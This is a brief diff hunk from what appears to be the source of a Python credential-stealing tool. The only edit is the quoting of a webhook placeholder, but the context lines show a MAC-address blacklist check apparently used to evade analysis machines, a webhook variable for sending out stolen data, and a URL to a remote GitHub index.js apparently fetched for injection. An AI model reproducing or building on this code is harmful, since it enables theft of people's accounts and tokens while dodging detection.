@@ -51,7 +51,7 @@ if str(uuid.UUID(int=mac_address)) in BLACKLIST1:
 
 
 
-wh00k = '%WEBHOOK%'
+wh00k = "%WEBHOOK%"
 
 inj_url = "https://raw.githubusercontent.com/The-Mediant/lagnewalisui/main/index.js"
     
